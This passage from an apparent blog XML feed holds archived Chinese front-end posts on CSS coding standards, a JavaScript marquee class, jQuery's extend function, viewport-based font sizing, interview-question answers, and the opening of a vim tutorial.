简单举个例子，网页中的图片，如果没有设置width和height，在图片载入之前，他所占的空间为0，但是当他加载完毕之后，那块为0的空间突然被撑开了，这样会导致，他下面的元素重新排列和渲染，造成重绘（repaint）和回流（reflow）。我们在写css的时候，把元素的定位放在前头，首先让浏览器知道该元素是在文本流内还是外，具体在页面的哪个部位，接着让浏览器知道他们的宽度和高度，border等这些占用空间的属性，其他的属性都是在这个固定的区域内渲染的，差不多就是这个意思吧~(@frec)&nbsp;推荐文章：Poll Results: How do you order your CSS properties?&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; http://www.mozilla.org/css/base/content.css10. 小图片（必须）sprite 合并推荐文章：NodeJs智能合并CSS精灵图工具iSpriter11. （推荐）当编写针对特定html结构的样式时，使用元素名&nbsp;+&nbsp;类名1234/* 所有的nav都是针对ul编写的 */ ul.nav &#123; ...... &#125;“.a div”和”.a div.b”，为什么后者好？如果需求有所变化，在”.a”下有多加了一个div，试问，开始的样式是不是会影响后来的div啊~12. （推荐）IE Hack List123456789/* 针对ie的hack */selector &#123; property: value; /* 所有浏览器 */ property: value\9; /* 所有IE浏览器 */ property: value\0; /* IE8 */ +property: value; /* IE7 */ _property: value; /* IE6 */ *property: value; /* IE6-7 */&#125;当使用hack的时候想想能不能用更好的样式代替13. （不推荐）ie使用filter,（&nbsp;禁止）使用expression这里主要是效率问题，应该当格外注意，咱们要少用烧CPU的东西~&nbsp;14. （禁止）使用行内（inline）样式1&lt;p&gt;Barret Lee&lt;/p&gt;像这样的行内样式，最好用一个class代替。又如要隐藏某个元素，可以给他加一个class123.hide &#123; display: none;&#125;尽量做到样式和结构分离~15. （推荐）reset.css样式推荐网站：http://www.cssreset.com/16.（禁止）使用”*“来选择元素12345/*别这样写*/* &#123; margin: 0; padding: 0;&#125;这样写是没有必要的，一些元素在浏览器中默认有margin或padding值，但是只是部分元素，没有必要将所有元素的margin、padding值都置为0。17. 链接的样式，（务必）按照这个顺序来书写1a:link -&gt; a:visited -&gt; a:hover -&gt; a:active18. 等你补充…&nbsp;应该说在前面的话对于不同的团队、不同的需求，编码规范上有一些差异，这个很正常。最后上线的代码肯定不是上述遵从规范的，上线的代码都会经过打包和压缩。不同的人有不同的编码风格，当你是一个人作战的时候，你可以不用考虑这些，但是如果是团队开发，有一个规范还是很有指导价值的~ 这些规范是在团队开发过程中，集思广益总结出来的，不是很全面，如果你有好的建议，请提出来，我们一起打造一个良好的前端生态环境！ 后面我会陆续把HTML、JavaScript和LESS等规范罗列出来，大家共同进步！！！ 相关阅读：前端编码规范之JavaScript&nbsp;&nbsp;]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一个不陌生的JS效果-marquee,用css3来实现]]></title>
    <url>%2Fblog%2F2013%2F07%2F26%2F2013-07-26-cb-marquee-in-javascript%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 关于marquee，就不多说了，可以戳这里。毕竟他是一个很古老的元素，现在的标准里头也不推荐使用这个标签了。但平时一些项目中会经常碰到这样的效果，每次都是重新写一遍，麻烦！ JS类实现marquee今天倒弄了一个类，还不全，打个草稿吧~ 下次就凑合着用吧。DEMO在这里，戳我12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667/*** @author 靖鸣君* @email jingmingjun92@163.com* @description 滚动* @class Marquee* @param &#123;Object&#125;*/var Marquee = function()&#123; this.direction = &quot;top&quot;; this.speed = 30;&#125;;Marquee.prototype = &#123; //initial init: function(obj, setttings)&#123; this.obj = obj; this._createBox(); this.scroll(); if(settings)&#123; settings.direction &amp;&amp; (this.direction = settings.direction); settings.speed &amp;&amp; (this.speed = settings.speed); &#125; &#125;, _createBox: function()&#123; //create inner box A this.iBox = document.createElement(&quot;div&quot;); var iBox = this.iBox; with(iBox.style)&#123; width = &quot;100%&quot;; height = &quot;100%&quot;; overflow = &quot;hidden&quot;; &#125; iBox.setAttribute(&quot;id&quot;, &quot;marqueeBoxA&quot;); iBox.innerHTML = obj.innerHTML; //clone inner box B var iBox2 = iBox.cloneNode(true); iBox2.setAttribute(&quot;id&quot;, &quot;marqueeBoxB&quot;); //append to obj Box this.obj.innerHTML = &quot;&quot;; this.obj.appendChild(iBox); this.obj.appendChild(iBox2); &#125;, //animation scroll: function() &#123; var _self = this; this.timer = setInterval(function()&#123; _self._ani(); &#125;, this.speed); &#125;, //setInterval function _ani: function() &#123; if(obj.clientHeight - obj.scrollTop &lt;= 0)&#123; obj.scrollTop = obj.offsetHeight - obj.scrollTop + 1; &#125; else &#123; obj.scrollTop++; console.log(obj.offsetHeight, obj.scrollTop); &#125; &#125;, stop: function()&#123; clearInterval(this.timer); &#125;, start: function()&#123; this.scroll(); &#125;&#125;;gists地址：//gist.github.com/barretlee/6095976代码写的比较粗糙，下面说说这个思路：BoxA和BoxB内容相同，当BoxA滚动离开外层盒子时，把scrollTop设置成，当前的scrollTop - BoxA的高度，记得再加上一个1.思路很简单，操作也很方便，我比较习惯用scrollTop来控制移动，有的人也喜欢用绝对定位和相对定位配合，但是这样写出来的插件兼容性不是很好，有些页面定位元素太多，可能会造成插件的样式乱套。这个插件（楼主比较懒，还没有写完）的使用方式：1234var marquee = new Marquee(), obj = document.getElementById(&quot;box&quot;);marquee.init(obj);对应的html代码：12345678910111213141516171819202122232425&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Demo&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; #box &#123; width: 150px; height: 200px; border:1px solid #EFEFEF; background: #F8F8F8; padding:0 20px; line-height:22px; overflow:hidden; &#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;box&quot;&gt; 我是Barret Lee1&lt;br&gt; 我是Barret Lee2&lt;br&gt; 我是Barret Lee3&lt;br&gt; 我是Barret Lee4&lt;br&gt; 我是Barret Lee5&lt;br&gt; 我是Barret Lee1&lt;br&gt; 我是Barret Lee2&lt;br&gt; 我是Barret Lee3&lt;br&gt; 我是Barret Lee4&lt;br&gt; 我是Barret Lee5&lt;br&gt; &lt;/div&gt;&lt;/body&gt;&lt;/html&gt;当然，给了几个接口：1234marquee.init(obj, &#123; direction: &quot;xx&quot;, //这个还没写，一般就是top和left吧~ speed: 30&#125;);&nbsp;补充一个css3下marquee的知识点 12345678910111213141516171819overflow:-webkit-marquee;//指定溢出时滚动。-webkit-marquee-style:scroll | slide | alternate; //跑马灯样式，分三种。scroll，从一端滚动到另一端，内容完全滚入（消失）时重新开始。slide，从一端滚到另一端，内容接触到另一端后，立马重新开始。alternate，内容不跑到显示区域外，在里面来回碰壁反弹。这里主要用第一种。-webkit-marquee-repetition:infinite | number;// 跑马灯跑的次数，infinite 为无限多次，不结束。或者可以用正整数设置滚动的次数。-webkit-marquee-direction:up | down | left | right; //跑动的方向，这个要注意结合实际情况，即实际你操作的标签文本流溢出在哪个方向溢出。-webkit-marquee-speed:slow | normal | fast;//跑动的速度设置。 实例： 1234567891011121314151617181920212223242526272829303132333435363738&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Demo&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; h1 &#123; color:rgba(250,100,100,0.7); height:40px; line-height:40px; width:400px; overflow: -webkit-marquee; -webkit-marquee-style: scroll; -webkit-marquee-repetition: infinite; -webkit-marquee-direction: right; -webkit-marquee-speed:normal; border:1px #ccc solid; margin-top: 30px; &#125; h1.left &#123; -webkit-marquee-direction: left; &#125; h1.up &#123; -webkit-marquee-direction: up; &#125; h1.down &#123; -webkit-marquee-direction: down; &#125;&lt;/style&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;我是Barret Lee，Barret Lee，我是Barret Lee，Barret Lee，我是Barret Lee&lt;/h1&gt;&lt;h1 class=&quot;up&quot;&gt;我是Barret Lee，Barret Lee，我是Barret Lee，Barret Lee，我是Barret Lee&lt;/h1&gt;&lt;h1 class=&quot;left&quot;&gt;我是Barret Lee，Barret Lee，我是Barret Lee，Barret Lee，我是Barret Lee&lt;/h1&gt;&lt;h1 class=&quot;down&quot;&gt;我是Barret Lee，Barret Lee，我是Barret Lee，Barret Lee，我是Barret Lee&lt;/h1&gt;&lt;/body&gt;&lt;/html&gt; DEMO地址：http://qianduannotes.sinaapp.com/marquee/css3marquee.html&nbsp;（此属性在后续新版本中已经不提供支持了 &nbsp;修改于2013/11/09）这个还是蛮实用的~做下兼容性处理，我觉得，可以直接拿过来用：)]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解读jQuery中extend函数]]></title>
    <url>%2Fblog%2F2013%2F07%2F20%2F2013-07-20-cb-extend-in-jQuery%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 123$.extend.apply( null, [ true, &#123; &quot;a&quot; : 1, &quot;b&quot; : 2 &#125; ] );//console.log(window.a);//window.location.reload();$.extend.apply( null, [ true, &#123; &quot;a&quot; : 1, &quot;b&quot; : 2 &#125; ].concat( &#123; &quot;c&quot; : 3, &quot;d&quot; : 4 &#125; ) );//console.log(window.a) 一、问题： 1. null在这里是干啥？ 2. window.a分别是什么？ 二、我们先一起来了解下jQuery中的extend函数&nbsp;在jQuery-V1.2.6中： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152jQuery.extend = jQuery.fn.extend = function() &#123; // copy reference to target object var target = arguments[0] || &#123;&#125;, i = 1, length = arguments.length, deep = false, options; // Handle a deep copy situation if ( target.constructor == Boolean ) &#123; deep = target; target = arguments[1] || &#123;&#125;; // skip the boolean and the target i = 2; &#125; // Handle case when target is a string or something (possible in deep copy) if ( typeof target != &quot;object&quot; &amp;&amp; typeof target != &quot;function&quot; ) target = &#123;&#125;; // extend jQuery itself if only one argument is passed if ( length == i ) &#123; target = this; --i; &#125; for ( ; i &lt; length; i++ ) // Only deal with non-null/undefined values if ( (options = arguments[ i ]) != null ) // Extend the base object for ( var name in options ) &#123; var src = target[ name ], copy = options[ name ]; // Prevent never-ending loop if ( target === copy ) continue; // Recurse if we&apos;re merging object values if ( deep &amp;&amp; copy &amp;&amp; typeof copy == &quot;object&quot; &amp;&amp; !copy.nodeType ) target[ name ] = jQuery.extend( deep, // Never move original objects, clone them src || ( copy.length != null ? [ ] : &#123; &#125; ) , copy ); // Don&apos;t bring in undefined values else if ( copy !== undefined ) target[ name ] = copy; &#125; // Return the modified object return target;&#125;;jQuery - v1.2.6 extend 在jQuery-V1.8.2中： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566jQuery.extend = jQuery.fn.extend = function() &#123; var options, name, src, copy, copyIsArray, clone, target = arguments[0] || &#123;&#125;, i = 1, length = arguments.length, deep = false; // Handle a deep copy situation if ( typeof target === &quot;boolean&quot; ) &#123; deep = target; target = arguments[1] || &#123;&#125;; // skip the boolean and the target i = 2; &#125; // Handle case when target is a string or something (possible in deep copy) if ( typeof target !== &quot;object&quot; &amp;&amp; !jQuery.isFunction(target) ) &#123; target = &#123;&#125;; &#125; // extend jQuery itself if only one argument is passed if ( length === i ) &#123; target = this; --i; &#125; for ( ; i &lt; length; i++ ) &#123; // Only deal with non-null/undefined values if ( (options = arguments[ i ]) != null ) &#123; // Extend the base object for ( name in options ) &#123; src = target[ name ]; copy = options[ name ]; // Prevent never-ending loop if ( target === copy ) &#123; continue; &#125; // Recurse if we&apos;re merging plain objects or arrays if (deep &amp;&amp; copy &amp;&amp; (jQuery.isPlainObject(copy) || (copyIsArray = jQuery.isArray(copy))))&#123; if ( copyIsArray ) &#123; copyIsArray = false; clone = src &amp;&amp; jQuery.isArray(src) ? src : []; &#125; else &#123; clone = src &amp;&amp; jQuery.isPlainObject(src) ? src : &#123;&#125;; &#125; // Never move original objects, clone them target[ name ] = jQuery.extend( deep, clone, copy ); // Don&apos;t bring in undefined values &#125; else if ( copy !== undefined ) &#123; target[ name ] = copy; &#125; &#125; &#125; &#125; // Return the modified object return target;&#125;;jQuery - V1.8.2 extend &nbsp;比较两个版本的jQuery，extend函数总体构架上基本没有变化，高版本中写代码更加规范了，很多var变量都前置（这是比较好的编码习惯，当然，也是为了方便压缩工具对代码进行压缩）。jQuery.fn.extend就是把extend函数绑定到他的原型链中。这样一来，既可以作为静态函数在$上直接引用($.extend)，也可以在$(obj)上使用extend。jQuery.extend() API文档jQuery.fn.extend() API文档注意，如果函数没有在原型链上绑定，是不能被\继承”的！ 代码大概的意思就是： 1234567 第一个参数是boolean类型 ---------&gt; 深度递归复制||---------&gt; 如果只有一个参数（除第一个boolean）---------&gt; 将函数的this环境extend进去 | | ---------&gt; 将后面的参数extend到\第一个&quot;参数中 ---------&gt; 返回\第一个&quot;参数 三、问题解释&nbsp;第一个问题中，1$.extend.apply( null, [ true, &#123; &quot;a&quot; : 1, &quot;b&quot; : 2 &#125; ] );extend作为一个静态函数被调用，null被绑定，但是因为满足\只有一个”参数（boolean除外）的条件 ， 将函数的this环境（window）extend进去，return的对象就是window对象，所以得到的结果是 12345678window &lt;p&gt;&lt;span&gt;即，window.a = 1&lt;/span&gt;&lt;/p&gt;&lt;p&gt;&amp;nbsp;&lt;img src=&quot;//img.alicdn.com/tfs/TB1oyqGa_tYBeNjy1XdXXXXyVXa-300-300.png&quot; data-original=&quot;/blogimgs/2013/07/20/20134313-96862ff8cfa84a72a7ef6ab81b6d66a6.jpg&quot; data-source=&quot;http://images.cnitblog.com/blog/387325/201307/20134313-96862ff8cfa84a72a7ef6ab81b6d66a6.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;ul&gt;&lt;li&gt;&lt;strong&gt;&lt;span&gt;第二个问题中，&lt;/span&gt;&lt;/strong&gt;&lt;/li&gt;&lt;/ul&gt; $.extend.apply( null, [ true, { “a” : 1, “b” : 2 } ].concat( { “c” : 3, “d” : 4 } ) ); 123456789&lt;p&gt;相当于传入三个参数，第一个是true，第二个是 匿名对象&#123; &quot;a&quot; : 1, &quot;b&quot; : 2 &#125;，第三个是匿名对象&#123; &quot;c&quot; : 3, &quot;d&quot; : 4 &#125;, 此时的this环境是null（因为将函数绑定到null上面了）。&lt;/p&gt;&lt;p&gt;那么结果就是&#123; &quot;a&quot; : 1, &quot;b&quot; : 2,&amp;nbsp;&quot;c&quot; : 3, &quot;d&quot; : 4 &#125;, 此刻并不能在window中索引到a这个属性&lt;/p&gt;&lt;p&gt;&lt;img src=&quot;//img.alicdn.com/tfs/TB1oyqGa_tYBeNjy1XdXXXXyVXa-300-300.png&quot; data-original=&quot;/blogimgs/2013/07/20/20134220-8b0da1f1b68c41d190e65c9925dca2c4.jpg&quot; data-source=&quot;http://images.cnitblog.com/blog/387325/201307/20134220-8b0da1f1b68c41d190e65c9925dca2c4.jpg&quot; alt=&quot;&quot;&gt;&lt;/p&gt;&lt;p&gt;如要想要访问，那便是null.a，但这种访问方式肯定是不对的。&lt;/p&gt;&lt;p&gt;由于没有变量来接收这个返回的值，所以被作为垃圾给回收了。&lt;/p&gt;&lt;p&gt;有兴趣的童鞋可以试试这个：&lt;/p&gt; $.extend.apply( $, [ true, { “a” : 1, “b” : 2 } ] );$.extend.apply( $, [ true, { “a” : 1, “b” : 2 } ].concat( { “c” : 3, “d” : 4 } ) ); ` 把$作为当前的环境，看看a被绑定在那个元素上了~ &nbsp;四、小结 jQuery是一个非常优秀的JS库，也是前辈们学习JS后经验的总结和思想的结晶，从jQuery1.2版本到现在的2.0版本，代码风格上、函数处理方式上有比较明显的改变，很值得花些功夫去研究。学习的过程中多看看ta们的编码风格、编码规范，了解库的整体构架和实现原理，这样应该会有比较大的提升~ 我觉得前端这方面想独树一帜，就必须在代码中体现自己的思想。]]></content>
      <categories>
        <category>JavaScript</category>
        <category>杂物间</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[字体大小自适应纯css解决方案]]></title>
    <url>%2Fblog%2F2013%2F07%2F04%2F2013-07-04-cb-change-fontSize-with-pure-css%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. viewpoint css3提供了一些与当前viewpoint相关的元素，vw，vh，vim等。 123456\viewpoint&quot; = window sizevw = 1% of viewport width1vh = 1% of viewport height1vmin = 1vw or 1vh, 最小1vmax = 1vw or 1vh, 最大 兼容性：chrome 20+/ safari 6+/ IE 10+ / FF 19+ / IOS 6+DEMO地址：http://qianduannotes.sinaapp.com/test/fontResize.html&nbsp; （已经用JS修正重绘bug） 12345678910111213141516&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;Demo&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; #box &#123; font-size: 4vw;&#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div id=&quot;box&quot;&gt; 我是Barret Lee 我是Barret Lee 我是Barret Lee &lt;/div&gt;&lt;/body&gt;&lt;/html&gt; 但是该方案存在一个bug，上面的代码，当浏览器窗口变化的时候，box中的文字并没有按照应有的比例变化，但是css3标准中是这么说的：When the height or width of the viewport is changed, they are scaled accordingly.插曲像这样的问题，我之前也遇到过，比如以下代码：（小插曲，可跳过） 12345678910111213141516&lt;!DOCTYPE HTML&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;title&gt;CSS3 Demo&lt;/title&gt; &lt;style type=&quot;text/css&quot;&gt; body, div &#123; margin:0; padding: 0;&#125; .wrap &#123; background: blue; width: 100%;&#125; .box &#123; width: 900px; height: 200px;&#125; &lt;/style&gt;&lt;/head&gt;&lt;body&gt; &lt;div class=&quot;wrap&quot;&gt;&lt;div class=&quot;box&quot;&gt;&lt;/div&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt; DEMO地址：http://qianduannotes.sinaapp.com/test/paintBug.html box的宽度设置为900px，wrap设置为100%；缩小浏览器窗口，当宽度小于900时会出现滚动条，向右滚动，会发现蓝色部分并不是100%，这个问题大家可以去思考下。 bug处理 回到上面的问题，font-size:4vw，应该会使得字体的大小变化，可是他没有，和标准说的不一样，所以可以认为是一个bug。 1234window.onresize = function()&#123; var box = document.getElementById(&quot;box&quot;); box.style[&quot;z-index&quot;] = 1;&#125; &nbsp;z-index可以对应的元素被重绘（repaint）。 &nbsp;延伸一点点关于重绘（repaint）和回流（reflow）的知识： 12345678910111213141516 1. 添加、删除元素(回流+重绘) 2. 隐藏元素，display:none(回流+重绘)，visibility:hidden(只重绘，不回流) 3. 移动元素，比如改变top,left(jquery的animate方法就是,改变top,left不一定会影响回流)，或者移动元素到另外1个父元素中。(重绘+回流) 4. 对style的操作(对不同的属性操作，影响不一样) 5. 还有一种是用户的操作，比如改变浏览器大小，改变浏览器的字体大小等(回流+重绘) 让我们看看下面的代码是如何影响回流和重绘的:var s = document.body.style;s.padding = &quot;2px&quot;; // 回流+重绘s.border = &quot;1px solid red&quot;; // 再一次 回流+重绘s.color = &quot;blue&quot;; // 再一次重绘s.backgroundColor = &quot;#ccc&quot;; // 再一次 重绘s.fontSize = &quot;14px&quot;; // 再一次 回流+重绘// 添加node，再一次 回流+重绘关于重绘和回流 &nbsp;其他方案 1. css expression， 这个效率比较低，不推荐使用 123456#box &#123; star:expression(onresize = function()&#123; var res = parseInt(this.style.width) / 20; res = res &lt; 9 : &quot;9px&quot; ? res + &quot;px&quot;; this.style.fontSize = res; &#125;); &#125;//P.S:上面代码没测试，不知道写错没有 与其说用的css，还不如说是JS，而且是效率不够的JS。 2. media query，这东西也不是特别好用 123456789h2&#123; font-size:25px&#125;@media screen and (max-width: 850px)&#123;/* 可视区域小于 850px, 设置更小font-size属性 */ h2&#123; font-size:19px; &#125;&#125; 用media query会使得字体的变化出现不连贯性，而且要可能设置多个@media，相当麻烦。 3. media query + -webkit-transition&nbsp;实现平滑转变&nbsp;DEMO地址：http://qianduannotes.sinaapp.com/test/fontResize2.html 123456789101112131415div&#123; font-size: 40px; -webkit-transition:font-size 0.2s ease-out;&#125;@media only screen and (max-width: 1200px) &#123; div&#123; font-size: 39px; &#125;&#125;@media only screen and (max-width: 1100px) &#123; div&#123; font-size: 38px; &#125;&#125;@media only screen and (max-width: 1000px) &#123; div&#123; font-size: 37px; &#125;&#125;@media only screen and (max-width: 900px) &#123; div&#123; font-size: 36px; &#125;&#125;@media only screen and (max-width: 800px) &#123; div&#123; font-size: 35px; &#125;&#125;@media only screen and (max-width: 700px) &#123; div&#123; font-size: 34px; &#125;&#125;@media only screen and (max-width: 600px) &#123; div&#123; font-size: 33px; &#125;&#125;@media only screen and (max-width: 500px) &#123; div&#123; font-size: 32px; &#125;&#125;@media only screen and (max-width: 400px) &#123; div&#123; font-size: 31px; &#125;&#125;@media only screen and (max-width: 300px) &#123; div&#123; font-size: 30px; &#125;&#125; 小结 这玩意儿其实也没太大作用，用JS处理相当简单，不知道大家还有没有其他比较好的方案，可以提出来交流下~ 参考文档 &nbsp; *&nbsp;Viewport Sized Typography]]></content>
      <categories>
        <category>前端杂烩</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[浅谈叶小钗面试的几个问题]]></title>
    <url>%2Fblog%2F2013%2F06%2F27%2F2013-06-27-cb-answers%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 问题： 链接地址：http://www.cnblogs.com/yexiaochai/p/3158443.html① 作用域问题 123456var a = 6;setTimeout(function () &#123; alert(a); a = 666;&#125;, 1000);a = 66; 这道题，我可耻的没有答起，我面试结束刚刚上出租就知道这道题很水了。。。。考察作用域的，当时活生生的被大神气场照住了，周围人的集体智商都减低了！！！② 语义化标签这道题我确实没辙，之前其实差点写类似的博客，却没有写，今天结束后补上吧！1）tite与h1的区别2）b与strong的区别3）i与em的区别PS：不要小看这些题，80%人答不上来③ 事件绑定addEventListener，第三个参数是用来表示事件是以事件冒泡还是事件捕获这个各位都知道！但是他问的问题是：我们给一个dom同时绑定两个点击事件，一个用捕获，一个用冒泡，你来说下会执行几次事件，然后会先执行冒泡还是捕获！！！来吧，谁能说出来。。。。④ CSS选择器问题考察优先级问题，反正会出很多莫名其妙的变形，比如将style标签写在body后与body前有什么区别，比如同一dom应用多个class其应该如何表现，比如class a定义颜色为blue，class b定义颜色为red，同时应用到dom上，dom作何显示。。。好吧各位去回答吧。。。。。 浅见： 1. JS单线程setTimeout加入到队列的后面 所以结果是66如果题目是这样 123456var a = 6;setTimeout(function () &#123; alert(a); var a = 666;&#125;, 1000);a = 66; 结果就是undefined（变量提升）2. 标签语义化1）你是不是写错了？title和alt的区别吧？2）和3），-&gt;语气b和i，一个是加粗，一个是斜体，都是视觉上的效果，而em和strong有情感色彩加强P.S：记得strong在IE和chrome显示不同，一个加粗一个未加粗3. 冒泡和捕捉addEventListener绑定几次就执行几次，即便绑定的函数一样也会多次执行，结果应该是先显示捕捉再显示冒泡冒泡，需要先冒泡到根节点（document，部分浏览器是html节点），再向下，碰到有绑定的DOM就执行；而捕捉是直接从根节点开始（这里我理解的也不是很深入）p.s：请移步http://www.cnblogs.com/yexiaochai/archive/2013/06/30/3163370.html4.css渲染如果写在body后会重新渲染整个页面；同一个DOM同时应用多个class，样式都会应用，重复的样式会覆盖 总体感觉面试的题目还是比较基础吧~呵呵，我前几天也被阿里面了，比较幸运的拿到了offer]]></content>
      <categories>
        <category>JavaScript</category>
        <category>观点和感想</category>
      </categories>
      <tags>
        <tag>tech</tag>
        <tag>cnblogs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vim操作全面讲解]]></title>
    <url>%2Fblog%2F2013%2F06%2F11%2F2013-06-11-cb-linux-learning-details%2F</url>
    <content type="text"><![CDATA[本文为归档内容,原始地址在 博客园. 目录第一讲移动光标VIM的进入和退出文本编辑之删除文本编辑之插入小结第二讲删除类命令其他删除类命令关于命令和对象对象命令的特殊情况撤消类命令小结第三讲置入类命令&nbsp;替换类命令&nbsp;更改类命令&nbsp;使用c指令的其他更改类命令&nbsp;小结&nbsp;第四讲定位及文件状态&nbsp;搜索类命令&nbsp;配对括号的查找&nbsp;修正错误的方法之一&nbsp;小结第五讲VIM 内执行外部命令的方法&nbsp;关于保存文件的更多信息&nbsp;一个具有选择性的保存命令&nbsp;提取和合并文件&nbsp;小结&nbsp;第六讲打开类命令&nbsp;光标后插入类命令&nbsp;另外一个置换类命令的版本设置类命令的选项&nbsp;小结第七讲 在线帮助命令&nbsp;第八讲 创建一个启动脚本 vim 是一个具有很多命令的功能非常强大的编辑器。限于篇幅，在本教程当中就不详细介绍了。本教程的设计目标是讲述一些必要的基本命令，而掌握好这些命令，您就能够很容易将vim当作一个通用的万能编辑器来使用了。完成本教程的内容大约需要25-30分钟，取决于您训练的时间。每一节的命令操作将会更改本文。推荐您复制本文的一个副本，然后在副本上进行训练(如果您是通过”vimtutor”来启动教程的，那么本文就已经是副本了)。 切记一点∶本教程的设计思路是在使用中进行学习的。也就是说，您需要通过执行命令来学习它们本身的正确用法。如果您只是阅读而不操作，那么您可能会很快遗忘这些命令的！好了，现在请确定您的Shift-Lock(大小写锁定键)还没有按下，然后按键盘上的字母键 j 足够多的次数来移动光标，直到第一节的内容能够完全充满屏幕。&nbsp; 第一讲&nbsp;第一节∶移动光标&nbsp;※※ 要移动光标，请依照说明分别按下 h、j、k、l 键。 ※※ ^ k 提示∶ h 的键位于左边，每次按下就会向左移动。 &lt; h l &gt; l 的键位于右边，每次按下就会向右移动。 j j 键看起来很象一支尖端方向朝下的箭头。 v 1. 请随意在屏幕内移动光标，直至您觉得舒服为止。 2. 按下下行键(j)，直到出现光标重复下行。—&gt; 现在您应该已经学会如何移动到下一讲吧。 3. 现在请使用下行键，将光标移动到第二讲。提示∶如果您不敢确定您所按下的字母，请按下&lt;ESC&gt;键回到正常(Normal)模式。然后再次从键盘输入您想要的命令。提示∶光标键应当也能正常工作的。但是使用hjkl键，在习惯之后您就能够快速地在屏幕内四处移动光标了。第二节∶VIM的进入和退出&nbsp;!! 特别提示∶敬请阅读完整本一节的内容，然后才能执行以下所讲解的命令。 1. 请按&lt;ESC&gt;键(这是为了确保您处在正常模式)。 2. 然后输入∶ :q! &lt;回车&gt;—&gt; 这种方式的退出编辑器绝不会保存您进入编辑器以来所做的改动。 如果您想保存更改再退出，请输入∶ :wq &lt;回车&gt; 3. 如果您看到了命令行提示符，请输入能够带您回到本教程的命令，那就是∶ vimtutor &lt;回车&gt; 通常情况下您也可以用这种方式∶ vim tutor &lt;回车&gt;—&gt; 这里的 ‘vim’ 表示进入vim编辑器，而 ‘tutor’则是您准备要编辑的文件。 4. 如果您自信已经牢牢记住了这些步骤的话，请从步骤1执行到步骤3退出，然 后再次进入编辑器。接着将光标移动到第一讲第三节来继续我们的教程讲解。 第三节∶文本编辑之删除&nbsp; 在正常(Normal)模式下，可以按下 x 键来删除光标所在位置的字符。 1. 请将光标移动到本节中下面标记有 —&gt; 的那一行。 2. 为了修正输入错误，请将光标移至准备删除的字符的位置处。 3. 然后按下 x 键将错误字符删除掉。 4. 重复步骤2到步骤4，直到句子修正为止。—&gt; The ccow jumpedd ovverr thhe mooon. 5. 好了，该行已经修正了，下一节内容是第一讲第四节。特别提示∶在您浏览本教程时，不要强行记忆。记住一点∶在使用中学习。 第四节∶文本编辑之插入&nbsp; 在正常模式下，可以按下 i 键来插入文本。 1. 请将光标移动到本节中下面标记有 —&gt; 的第一行。 2. 为了使得第一行内容雷同于第二行，请将光标移至文本第一个字符准备插入 的位置。 3. 然后按下 i 键，接着输入必要的文本字符。 4. 所有文本都修正完毕，请按下 &lt;ESC&gt; 键返回正常模式。重复步骤2至步骤4以便修正句子。—&gt; There is text misng this .—&gt; There is some text missing from this line. 5. 如果您对文本插入操作已经很满意，请接着阅读下面的小结。 第一讲小结&nbsp; 1. 光标在屏幕文本中的移动既可以用箭头键，也可以使用 hjkl 字母键。 h (左移) j (下行) k (上行) l (右移) 2. 欲进入vim编辑器(从命令行提示符)，请输入∶vim 文件名 &lt;回车&gt; 3. 欲退出vim编辑器，请输入以下命令放弃所有修改∶ &lt;ESC&gt; :q! &lt;回车&gt; 或者输入以下命令保存所有修改∶ &lt;ESC&gt; :wq &lt;回车&gt; 4. 在正常模式下删除光标所在位置的字符，请按∶ x 5. 在正常模式下要在光标所在位置开始插入文本，请按∶ i 输入必要文本 &lt;ESC&gt;特别提示∶按下 &lt;ESC&gt; 键会带您回到正常模式或者取消一个不期望或者部分完成的命令。好了，第一讲到此结束。下面接下来继续第二讲的内容。 &nbsp;第二讲 第一节∶删除类命令&nbsp; 输入 dw 可以从光标处删除至一个单字/单词的末尾。 1. 请按下 &lt;ESC&gt; 键确保您处于正常模式。 2. 请将光标移动到本节中下面标记有 —&gt; 的那一行。 3. 请将光标移至准备要删除的单词的开始。 4. 接着输入 dw 删除掉该单词。 特别提示:&nbsp;您所输入的 dw 会在您输入的同时出现在屏幕的最后一行。如果您输入有误，请按下 &lt;ESC&gt; 键取消，然后重新再来。—&gt; There are a some words fun that don’t belong paper in this sentence. 5. 重复步骤3至步骤4，直至句子修正完毕。接着继续第二讲第二节内容。 第二节∶其他删除类命令&nbsp; 输入 d$ 从当前光标删除到行末。 1. 请按下 &lt;ESC&gt; 